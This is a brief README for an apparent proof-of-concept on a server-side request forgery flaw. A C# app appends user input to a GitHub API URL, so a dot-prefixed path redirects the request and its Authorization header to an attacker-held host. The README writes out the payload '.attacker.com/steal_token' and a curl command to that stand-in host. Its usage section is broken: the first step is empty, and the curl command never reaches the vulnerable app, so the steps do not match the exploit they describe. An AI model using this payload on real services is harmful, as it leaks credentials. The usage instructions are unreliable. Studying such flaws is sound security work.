# SSRF via Regex Bypass

This repository contains a proof-of-concept (PoC) exploit for a **Server-Side Request Forgery (SSRF)** vulnerability in a C# web application. The vulnerability arises due to improper handling of user-supplied paths in API requests.

## Vulnerability Details

- The application constructs an API request by concatenating user input (`path`) with a base URL (`https://api.github.com`).
- If the `path` starts with a dot (`.`), it can lead to **URL Injection**, allowing an attacker to redirect requests to an external server (e.g., `https://api.github.com.attacker.com/steal_token`).
- The application includes an `Authorization` header with sensitive credentials, which may be leaked to the attacker's server.

## Exploit Scenario

An attacker can:

1. Submit a crafted request with `path=.attacker.com/steal_token`.
2. The server constructs a request to `https://api.github.com.attacker.com/steal_token` instead of GitHub.
3. The **Authorization header** is included in the request, exposing credentials to the attacker's server.

## Exploit Usage

### 1. Run the vulnerable C# application:

### 2. Send a malicious request:

```bash
curl -X GET "https://api.github.com.attacker.com/steal_token"
```

### 3. If the exploit is successful, the request is redirected and sensitive credentials may be leaked! 🚀


### References
https://www.sonarsource.com/knowledge/code-challenges/advent-calendar-2022/
